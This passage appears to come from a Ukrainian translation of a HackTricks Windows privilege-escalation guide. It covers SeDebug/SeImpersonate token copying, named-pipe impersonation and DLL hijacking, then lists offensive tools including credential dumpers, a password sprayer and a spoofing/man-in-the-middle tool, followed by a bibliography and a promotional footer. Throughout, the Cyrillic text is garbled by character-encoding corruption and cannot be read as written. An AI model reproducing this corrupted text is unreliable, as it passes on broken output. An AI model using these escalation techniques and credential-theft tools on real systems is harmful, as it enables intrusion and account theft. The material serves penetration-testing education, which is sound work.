### –í—ñ–¥ SeDebug + SeImpersonate –¥–æ –ø–æ–≤–Ω–∏—Ö –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ —Ç–æ–∫–µ–Ω–∞

–Ø–∫—â–æ —É –≤–∞—Å —î —Ü—ñ –ø—Ä–∏–≤—ñ–ª–µ—ó —Ç–æ–∫–µ–Ω–∞ (—ñ–º–æ–≤—ñ—Ä–Ω–æ, –≤–∏ –∑–Ω–∞–π–¥–µ—Ç–µ —Ü–µ –≤–∂–µ –≤ –ø—Ä–æ—Ü–µ—Å—ñ –≤–∏—Å–æ–∫–æ–≥–æ –ø—Ä—ñ–æ—Ä–∏—Ç–µ—Ç—É), –≤–∏ –∑–º–æ–∂–µ—Ç–µ **–≤—ñ–¥–∫—Ä–∏—Ç–∏ –º–∞–π–∂–µ –±—É–¥—å-—è–∫–∏–π –ø—Ä–æ—Ü–µ—Å** (–Ω–µ –∑–∞—Ö–∏—â–µ–Ω—ñ –ø—Ä–æ—Ü–µ—Å–∏) –∑ –ø—Ä–∏–≤—ñ–ª–µ—î–º SeDebug, **—Å–∫–æ–ø—ñ—é–≤–∞—Ç–∏ —Ç–æ–∫–µ–Ω** –ø—Ä–æ—Ü–µ—Å—É —Ç–∞ —Å—Ç–≤–æ—Ä–∏—Ç–∏ **–¥–æ–≤—ñ–ª—å–Ω–∏–π –ø—Ä–æ—Ü–µ—Å –∑ —Ü–∏–º —Ç–æ–∫–µ–Ω–æ–º**.\
–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Ü—é —Ç–µ—Ö–Ω—ñ–∫—É, –∑–∞–∑–≤–∏—á–∞–π **–≤–∏–±–∏—Ä–∞—î—Ç—å—Å—è –±—É–¥—å-—è–∫–∏–π –ø—Ä–æ—Ü–µ—Å, —â–æ –ø—Ä–∞—Ü—é—î —è–∫ SYSTEM –∑ —É—Å—ñ–º–∞ –ø—Ä–∏–≤—ñ–ª–µ—è–º–∏ —Ç–æ–∫–µ–Ω–∞** (_—Ç–∞–∫, –≤–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ –ø—Ä–æ—Ü–µ—Å–∏ SYSTEM –±–µ–∑ —É—Å—ñ—Ö –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ —Ç–æ–∫–µ–Ω–∞_).\
**–í–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏** [**–ø—Ä–∏–∫–ª–∞–¥ –∫–æ–¥—É, —â–æ –≤–∏–∫–æ–Ω—É—î –∑–∞–ø—Ä–æ–ø–æ–Ω–æ–≤–∞–Ω—É —Ç–µ—Ö–Ω—ñ–∫—É —Ç—É—Ç**](sedebug-+-seimpersonate-copy-token.md)**.**

### **–Ü–º–µ–Ω–æ–≤–∞–Ω—ñ –∫–∞–Ω–∞–ª–∏**

–¶—è —Ç–µ—Ö–Ω—ñ–∫–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è meterpreter –¥–ª—è –µ—Å–∫–∞–ª–∞—Ü—ñ—ó –≤ `getsystem`. –¢–µ—Ö–Ω—ñ–∫–∞ –ø–æ–ª—è–≥–∞—î –≤ **—Å—Ç–≤–æ—Ä–µ–Ω–Ω—ñ –∫–∞–Ω–∞–ª—É, –∞ –ø–æ—Ç—ñ–º —Å—Ç–≤–æ—Ä–µ–Ω–Ω—ñ/–∑–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—ñ —Å–µ—Ä–≤—ñ—Å—É –¥–ª—è –∑–∞–ø–∏—Å—É –≤ —Ü–µ–π –∫–∞–Ω–∞–ª**. –ü–æ—Ç—ñ–º **—Å–µ—Ä–≤–µ—Ä**, —è–∫–∏–π —Å—Ç–≤–æ—Ä–∏–≤ –∫–∞–Ω–∞–ª, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –ø—Ä–∏–≤—ñ–ª–µ–π **`SeImpersonate`**, –∑–º–æ–∂–µ **—ñ–º—ñ—Ç—É–≤–∞—Ç–∏ —Ç–æ–∫–µ–Ω** –∫–ª—ñ—î–Ω—Ç–∞ –∫–∞–Ω–∞–ª—É (—Å–µ—Ä–≤—ñ—Å—É), –æ—Ç—Ä–∏–º—É—é—á–∏ –ø—Ä–∏–≤—ñ–ª–µ—ó SYSTEM.\
–Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ [**–¥—ñ–∑–Ω–∞—Ç–∏—Å—è –±—ñ–ª—å—à–µ –ø—Ä–æ —ñ–º–µ–Ω–æ–≤–∞–Ω—ñ –∫–∞–Ω–∞–ª–∏, –≤–∞–º —Å–ª—ñ–¥ –ø—Ä–æ—á–∏—Ç–∞—Ç–∏ —Ü–µ**](./#named-pipe-client-impersonation).\
–Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø—Ä–æ—á–∏—Ç–∞—Ç–∏ –ø—Ä–∏–∫–ª–∞–¥ [**—è–∫ –ø–µ—Ä–µ–π—Ç–∏ –≤—ñ–¥ –≤–∏—Å–æ–∫–æ–≥–æ –ø—Ä—ñ–æ—Ä–∏—Ç–µ—Ç—É –¥–æ System, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —ñ–º–µ–Ω–æ–≤–∞–Ω—ñ –∫–∞–Ω–∞–ª–∏, –≤–∞–º —Å–ª—ñ–¥ –ø—Ä–æ—á–∏—Ç–∞—Ç–∏ —Ü–µ**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

–Ø–∫—â–æ –≤–∏ –∑–º–æ–∂–µ—Ç–µ **–ø—ñ–¥–º–∞–Ω—ñ—Ç–∏ dll**, —è–∫—É **–∑–∞–≤–∞–Ω—Ç–∞–∂—É—î** –ø—Ä–æ—Ü–µ—Å, —â–æ –ø—Ä–∞—Ü—é—î —è–∫ **SYSTEM**, –≤–∏ –∑–º–æ–∂–µ—Ç–µ –≤–∏–∫–æ–Ω–∞—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω–∏–π –∫–æ–¥ –∑ —Ü–∏–º–∏ –¥–æ–∑–≤–æ–ª–∞–º–∏. –¢–æ–º—É Dll Hijacking —Ç–∞–∫–æ–∂ –∫–æ—Ä–∏—Å–Ω–∏–π –¥–ª—è —Ü—å–æ–≥–æ –≤–∏–¥—É –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤, —ñ, –±—ñ–ª—å—à–µ —Ç–æ–≥–æ, —è–∫—â–æ —Ü–µ **–Ω–∞–±–∞–≥–∞—Ç–æ –ø—Ä–æ—Å—Ç—ñ—à–µ –¥–æ—Å—è–≥—Ç–∏ –∑ –≤–∏—Å–æ–∫–æ–ø—Ä—ñ–æ—Ä–∏—Ç–µ—Ç–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—É**, –æ—Å–∫—ñ–ª—å–∫–∏ –≤—ñ–Ω –º–∞—Ç–∏–º–µ **–ø—Ä–∞–≤–∞ –Ω–∞ –∑–∞–ø–∏—Å** —É –ø–∞–ø–∫–∞—Ö, —è–∫—ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è –¥–ª—è –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è dlls.\
**–í–∏ –º–æ–∂–µ—Ç–µ** [**–¥—ñ–∑–Ω–∞—Ç–∏—Å—è –±—ñ–ª—å—à–µ –ø—Ä–æ Dll hijacking —Ç—É—Ç**](dll-hijacking.md)**.**

### **–í—ñ–¥ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞ –∞–±–æ —Å–ª—É–∂–±–∏ –º–µ—Ä–µ–∂—ñ –¥–æ System**

{% embed url="https://github.com/sailay1996/RpcSsImpersonator" %}

### –í—ñ–¥ LOCAL SERVICE –∞–±–æ NETWORK SERVICE –¥–æ –ø–æ–≤–Ω–∏—Ö –ø—Ä–∏–≤—ñ–ª–µ—ó–≤

**–ß–∏—Ç–∞–π—Ç–µ:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## –î–æ–¥–∞—Ç–∫–æ–≤–∞ –¥–æ–ø–æ–º–æ–≥–∞

[–°—Ç–∞—Ç–∏—á–Ω—ñ –±—ñ–Ω–∞—Ä–Ω—ñ —Ñ–∞–π–ª–∏ impacket](https://github.com/ropnop/impacket_static_binaries)

## –ö–æ—Ä–∏—Å–Ω—ñ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏

**–ù–∞–π–∫—Ä–∞—â–∏–π —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –¥–ª—è –ø–æ—à—É–∫—É –≤–µ–∫—Ç–æ—Ä—ñ–≤ –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –Ω–∞ –ª–æ–∫–∞–ª—å–Ω–æ–º—É –∫–æ–º–ø'—é—Ç–µ—Ä—ñ –∑ Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- –ü–µ—Ä–µ–≤—ñ—Ä–∫–∞ –Ω–∞ –ø–æ–º–∏–ª–∫–∏ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó —Ç–∞ —á—É—Ç–ª–∏–≤—ñ —Ñ–∞–π–ª–∏ (**[**–ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ —Ç—É—Ç**](../../windows/windows-local-privilege-escalation/broken-reference/)**). –í–∏—è–≤–ª–µ–Ω–æ.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- –ü–µ—Ä–µ–≤—ñ—Ä–∫–∞ –º–æ–∂–ª–∏–≤–∏—Ö –ø–æ–º–∏–ª–æ–∫ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó —Ç–∞ –∑–±—ñ—Ä —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó (**[**–ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ —Ç—É—Ç**](../../windows/windows-local-privilege-escalation/broken-reference/)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- –ü–µ—Ä–µ–≤—ñ—Ä–∫–∞ –Ω–∞ –ø–æ–º–∏–ª–∫–∏ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- –í–∏—Ç—è–≥—É—î —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ –∑–±–µ—Ä–µ–∂–µ–Ω—ñ —Å–µ—Å—ñ—ó PuTTY, WinSCP, SuperPuTTY, FileZilla —Ç–∞ RDP. –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ -Thorough –ª–æ–∫–∞–ª—å–Ω–æ.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- –í–∏—Ç—è–≥—É—î –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ –∑ –¥–∏—Å–ø–µ—Ç—á–µ—Ä–∞ –æ–±–ª—ñ–∫–æ–≤–∏—Ö –∑–∞–ø–∏—Å—ñ–≤. –í–∏—è–≤–ª–µ–Ω–æ.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- –†–æ–∑–ø–∏–ª—é—î –∑—ñ–±—Ä–∞–Ω—ñ –ø–∞—Ä–æ–ª—ñ –ø–æ –¥–æ–º–µ–Ω—É**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh - —Ü–µ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –¥–ª—è –ø—ñ–¥–º–∞–Ω—É–≤–∞–Ω–Ω—è ADIDNS/LLMNR/mDNS/NBNS —Ç–∞ man-in-the-middle –Ω–∞ PowerShell.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- –û—Å–Ω–æ–≤–Ω–∞ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∞ –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ Windows**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- –ü–æ—à—É–∫ –≤—ñ–¥–æ–º–∏—Ö —É—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ (–ó–ê–°–¢–ê–†–Ü–õ–û –¥–ª—è Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- –õ–æ–∫–∞–ª—å–Ω—ñ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ **(–ü–æ—Ç—Ä—ñ–±–Ω—ñ –ø—Ä–∞–≤–∞ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- –ü–æ—à—É–∫ –≤—ñ–¥–æ–º–∏—Ö —É—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ (–ø–æ—Ç—Ä—ñ–±–Ω–æ —Å–∫–æ–º–ø—ñ–ª—é–≤–∞—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é VisualStudio) ([**–ø–µ—Ä–µ–∫–æ–º–ø—ñ–ª—å–æ–≤–∞–Ω–æ**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- –ü–µ—Ä–µ–ª—ñ—á—É—î —Ö–æ—Å—Ç, —à—É–∫–∞—é—á–∏ –ø–æ–º–∏–ª–∫–∏ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó (–±—ñ–ª—å—à–µ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –¥–ª—è –∑–±–æ—Ä—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó, –Ω—ñ–∂ –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤) (–ø–æ—Ç—Ä—ñ–±–Ω–æ —Å–∫–æ–º–ø—ñ–ª—é–≤–∞—Ç–∏) **(**[**–ø–µ—Ä–µ–∫–æ–º–ø—ñ–ª—å–æ–≤–∞–Ω–æ**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- –í–∏—Ç—è–≥—É—î –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ –∑ –±–∞–≥–∞—Ç—å–æ—Ö –ø—Ä–æ–≥—Ä–∞–º (–ø–µ—Ä–µ–∫–æ–º–ø—ñ–ª—å–æ–≤–∞–Ω–∏–π exe –Ω–∞ github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- –ü–æ—Ä—Ç PowerUp –Ω–∞ C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- –ü–µ—Ä–µ–≤—ñ—Ä–∫–∞ –Ω–∞ –ø–æ–º–∏–ª–∫–∏ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó (–≤–∏–∫–æ–Ω—É–≤–∞–Ω–∏–π —Ñ–∞–π–ª –ø–µ—Ä–µ–∫–æ–º–ø—ñ–ª—å–æ–≤–∞–Ω–∏–π –Ω–∞ github). –ù–µ —Ä–µ–∫–æ–º–µ–Ω–¥–æ–≤–∞–Ω–æ. –ù–µ –ø—Ä–∞—Ü—é—î –¥–æ–±—Ä–µ –≤ Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- –ü–µ—Ä–µ–≤—ñ—Ä–∫–∞ –º–æ–∂–ª–∏–≤–∏—Ö –ø–æ–º–∏–ª–æ–∫ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó (exe –∑ python). –ù–µ —Ä–µ–∫–æ–º–µ–Ω–¥–æ–≤–∞–Ω–æ. –ù–µ –ø—Ä–∞—Ü—é—î –¥–æ–±—Ä–µ –≤ Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- –Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç, —Å—Ç–≤–æ—Ä–µ–Ω–∏–π –Ω–∞ –æ—Å–Ω–æ–≤—ñ —Ü—å–æ–≥–æ –ø–æ—Å—Ç—É (–¥–ª—è –ø—Ä–∞–≤–∏–ª—å–Ω–æ—ó —Ä–æ–±–æ—Ç–∏ –Ω–µ –ø–æ—Ç—Ä—ñ–±–Ω–æ accesschk, –∞–ª–µ –≤—ñ–Ω –º–æ–∂–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏—Å—è).

**–õ–æ–∫–∞–ª—å–Ω–æ**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- –ß–∏—Ç–∞—î –≤–∏–≤—ñ–¥ **systeminfo** —Ç–∞ —Ä–µ–∫–æ–º–µ–Ω–¥—É—î —Ä–æ–±–æ—á—ñ –µ–∫—Å–ø–ª–æ–π—Ç–∏ (–ª–æ–∫–∞–ª—å–Ω–∏–π python)\
[**Windows Exploit Suggester –Ω–∞—Å—Ç—É–ø–Ω–æ–≥–æ –ø–æ–∫–æ–ª—ñ–Ω–Ω—è**](https://github.com/bitsadmin/wesng) -- –ß–∏—Ç–∞—î –≤–∏–≤—ñ–¥ **systeminfo** —Ç–∞ —Ä–µ–∫–æ–º–µ–Ω–¥—É—î —Ä–æ–±–æ—á—ñ –µ–∫—Å–ø–ª–æ–π—Ç–∏ (–ª–æ–∫–∞–ª—å–Ω–∏–π python)

**Meterpreter**

_multi/recon/local\_exploit\_suggestor_

–í–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ —Å–∫–æ–º–ø—ñ–ª—é–≤–∞—Ç–∏ –ø—Ä–æ–µ–∫—Ç, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –ø—Ä–∞–≤–∏–ª—å–Ω—É –≤–µ—Ä—Å—ñ—é .NET ([–¥–∏–≤. —Ü–µ](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). –©–æ–± –ø–æ–±–∞—á–∏—Ç–∏ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω—É –≤–µ—Ä—Å—ñ—é .NET –Ω–∞ —Ö–æ—Å—Ç—ñ –∂–µ—Ä—Ç–≤–∏, –≤–∏ –º–æ–∂–µ—Ç–µ –∑—Ä–æ–±–∏—Ç–∏:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## –ë—ñ–±–ª—ñ–æ–≥—Ä–∞—Ñ—ñ—è

* [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)\\
* [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)\\
* [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\\
* [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)\\
* [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)\\
* [https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html)\\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)\\
* [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)\\
* [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)\\
* [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\\
* [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)\\
* [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\\
* [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* –ü—Ä–∞—Ü—é—î—Ç–µ –≤ **–∫—ñ–±–µ—Ä–±–µ–∑–ø–µ—Ü—ñ?** –•–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ **–≤–∞—à—É –∫–æ–º–ø–∞–Ω—ñ—é –≤ —Ä–µ–∫–ª–∞–º—ñ HackTricks**? –∞–±–æ —Ö–æ—á–µ—Ç–µ –º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ **–æ—Å—Ç–∞–Ω–Ω—å–æ—ó –≤–µ—Ä—Å—ñ—ó PEASS –∞–±–æ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É PDF**? –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –î—ñ–∑–Ω–∞–π—Ç–µ—Å—è –ø—Ä–æ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** [**üí¨**](https://emojipedia.org/speech-balloon/) [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –º–Ω–æ—é –Ω–∞ **Twitter** üê¶[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—é hacktricks**](https://github.com/carlospolop/hacktricks) **—Ç–∞** [**—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—é hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
